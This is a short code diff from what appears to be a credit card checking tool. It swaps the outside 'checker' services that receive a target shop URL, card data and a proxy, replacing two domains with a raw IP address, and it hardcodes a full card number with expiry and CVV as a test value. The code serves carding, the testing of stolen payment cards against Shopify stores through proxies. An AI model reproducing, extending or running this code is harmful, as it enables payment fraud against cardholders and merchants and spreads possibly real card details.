@@ -8152,9 +8152,7 @@ ${resultsDisplay || "Waiting for results..."}
       // Two API endpoints for checking sites
       const API_ENDPOINTS = [
         (site: string, cc: string, proxy: string) => 
-          `http://mentoschk.com/shopify?site=${site}&cc=${cc}&proxy=${proxy}`,
-        (site: string, cc: string, proxy: string) => 
-          `https://teamoicxkiller.online/code/index.php?url=${site}&cc=${cc}&proxy=${proxy}`,
+          `http://188.137.230.163:5000/shopify?site=${site}&cc=${cc}&proxy=${proxy}`,
       ];
       const TEST_CC = "4266841674104656|03|27|908";
 
